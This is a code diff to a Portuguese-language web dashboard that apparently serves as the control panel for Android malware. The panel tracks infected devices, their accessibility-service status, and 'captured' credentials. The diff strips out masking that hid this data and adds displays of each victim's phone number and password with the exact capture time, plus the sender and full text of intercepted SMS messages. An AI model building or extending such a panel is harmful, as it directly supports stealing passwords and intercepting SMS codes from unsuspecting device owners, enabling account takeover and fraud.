@@ -953,7 +953,7 @@ input,select,textarea{accent-color:#21c7b7}
         <div onclick="ordenarPor('modelo')" style="cursor:pointer">Dispositivo</div>
         <div onclick="ordenarPor('versao')" style="cursor:pointer">Versão</div>
         <div onclick="ordenarPor('ultimo_acesso')" style="cursor:pointer">Último acesso</div>
-        <div>Dados protegidos</div>
+        <div>Número</div>
         <div>Estado</div>
         <div></div>
       </div>
@@ -1532,7 +1532,7 @@ function renderLista(dispositivos, credenciais) {
         </div></div>
         <div class="cell hide-mobile">${escapeHtml(dev.versao||"—")}</div>
         <div class="cell hide-mobile">${escapeHtml(formatDate(dev.ultimo_acesso))}</div>
-        <div class="cell hide-mobile">${escapeHtml(dev.valor||"—")}</div>
+        <div class="cell hide-mobile">${escapeHtml(devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||dev.numero||"—")}</div>
         <div><span>${acessAtiva?"♿ ON":"♿ OFF"}</span> <span class="badge ${activo?"active":"idle"}">${activo?"ACTIVO":"INACTIVO"}</span></div>
       </div>
       <div class="history-panel"><div class="history-inner"><div class="history-grid">
@@ -1545,7 +1545,9 @@ function renderLista(dispositivos, credenciais) {
         </div>
         <div class="info-block"><h4>📊 Actividade</h4>
           <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val">${escapeHtml(formatDate(dev.ultimo_acesso))}</span></div>
-          <div class="info-row"><span class="info-label">Registos</span><span class="info-val">${devCreds.length} (conteúdo protegido)</span></div>
+          <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${escapeHtml(devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||dev.numero||'—')}</span></div>
+          <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${escapeHtml(devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||dev.senha||'—')}</span></div>
+          <div class="info-row"><span class="info-label">Registos</span><span class="info-val">${devCreds.length}</span></div>
           <div class="info-row"><span class="info-label">Estado</span><span class="info-val">${activo?"Activo hoje":"Inactivo"}</span></div>
           <div class="info-row"><span class="info-label">Acessibilidade</span><span class="info-val">${acessAtiva?"Activa":"Inactiva"}</span></div>
         </div>
@@ -1554,21 +1556,17 @@ function renderLista(dispositivos, credenciais) {
       <div class="device-sinais-container" data-device-id="${idAttr}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
       <div class="timeline-title">📋 Histórico de actividade</div>
       <div class="timeline">${devCreds.length===0?'<div class="empty">Sem registos</div>':devCreds.map(c=>`
-      
-      <div class="timeline">
-  ${devCreds.length === 0
-    ? '<div class="empty">Sem registos</div>'
-    : devCreds.map(c => `
         <div class="tl-item">
           <div class="tl-dot ${getTipoDot(c.tipo)}"></div>
-          <div class="tl-time">—</div>
+          <div class="tl-time">${formatDate(c.criado_em||c.created_at)}</div>
           <div class="tl-content">
-            <div class="tipo">${getTipoLabel(c.tipo)}</div>
-            <div>${escapeHtml(c.valor || "—")}</div>
+            <div class="tipo">${getTipoLabel(c.tipo)}
+              <span class="cred-capturado-em" title="Momento exacto da captura">🕒 ${formatDateHora(c.criado_em||c.created_at)}</span>
+            </div>
+            <div>${c.numero?'📞 '+escapeHtml(c.numero):''}${c.senha?' · 🔑 '+escapeHtml(c.senha):''}${c.valor?escapeHtml(c.valor):''}</div>
           </div>
         </div>
-      `).join("")
-  }
+      `).join('')}
 </div>
   </div>
 </div>
@@ -1576,7 +1574,7 @@ function renderLista(dispositivos, credenciais) {
       <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
       <div class="timeline" id="sms-${idAttr}" style="display:none">
         ${todasSMS.filter(s=>s.device_id===dev.device_id).map(s=>{const ms=Number(s.timestamp_ms),t=Number.isFinite(ms)?formatDate(new Date(ms).toISOString()):"—";return `
-          <div class="tl-item"><div class="tl-dot login"></div><div class="tl-time">${escapeHtml(t)}</div><div class="tl-content"><div class="tipo">📨 Mensagem recebida</div><div>Conteúdo da mensagem ocultado por segurança.</div></div></div>`;
+          <div class="tl-item"><div class="tl-dot login"></div><div class="tl-time">${escapeHtml(t)}</div><div class="tl-content"><div class="tipo">📨 ${escapeHtml(s.remetente)||'Desconhecido'}</div><div style="word-break:break-word;font-size:12px;color:var(--muted)">${escapeHtml(s.corpo)}</div></div></div>`;
         }).join("")}
       </div>
       <div><button onclick="forcarAtualizacao(${idArg})" class="btn btn-primary">🔄 Forçar actualização deste dispositivo</button></div>
